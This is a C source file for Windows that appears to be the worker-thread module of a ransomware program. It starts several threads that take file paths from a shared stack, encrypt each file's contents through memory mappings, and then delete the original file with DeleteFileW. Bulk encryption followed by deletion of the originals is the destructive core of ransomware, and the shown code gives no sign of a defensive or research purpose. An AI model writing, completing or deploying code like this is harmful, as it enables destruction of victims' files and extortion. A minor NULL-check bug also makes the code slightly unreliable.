#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "file_utils.h"
#include "encrypt.h"
#include "thread.h"
#include "stack.h"
#include "sync.h"

volatile int thread_job_running = 1;

struct Threads *thread_create(struct Stack *stack, struct ThreadParams **thread_params) {
    if(stack == NULL) return NULL;
    
    struct Threads *threads = malloc(sizeof(struct Threads));
    if(threads == NULL) return NULL;

    *thread_params = malloc(sizeof(struct ThreadParams));
    if(thread_params == NULL) {
        free(threads);
        return NULL;
    }
    
    (*thread_params)->stack = stack;
    for(int i = 0; i < N_THREADS; ++i) {
        if((threads->threads[i] = CreateThread(
            NULL,
            0,
            &thread_job,
            (LPVOID)(*thread_params),
            0,
            NULL
        )) == NULL) return NULL;
    }

    return threads; 
}

void thread_free(struct Threads **threads) {
    if((threads != NULL) && (*threads != NULL)) {
        for(int i = 0; i < N_THREADS; ++i) {
            CloseHandle((*threads)->threads[i]);
        }
        free((*threads));
        *threads = NULL;
    }
}

void thread_terminate() {
    thread_job_running = 0;
    for(int i = 0; i < N_THREADS; ++i) {
        sync_release_semaphore();
    }
}

void thread_wait_all(struct Threads *threads) {
    WaitForMultipleObjects(N_THREADS, threads->threads, TRUE, INFINITE);
}

DWORD WINAPI thread_job(LPVOID param) {
    LPVOID p_src, p_dst;
    DWORD file_size;
    wchar_t *file_path;
    struct ThreadParams *thread_params = (struct ThreadParams*)param;

    if(thread_params->stack == NULL) return 1;

    while(thread_job_running) {
        sync_wait_semaphore();
        sync_lock_mutex();
        file_path = (wchar_t *)stack_pop(thread_params->stack);
        sync_unlock_mutex();
        if(file_path) {
            fu_create_file_mappings(file_path, &file_size, &p_src, &p_dst);
            encrypt_data(p_src, p_dst, file_size);
            DeleteFileW(file_path);
            free(file_path);
        }
    }

    return 0;
}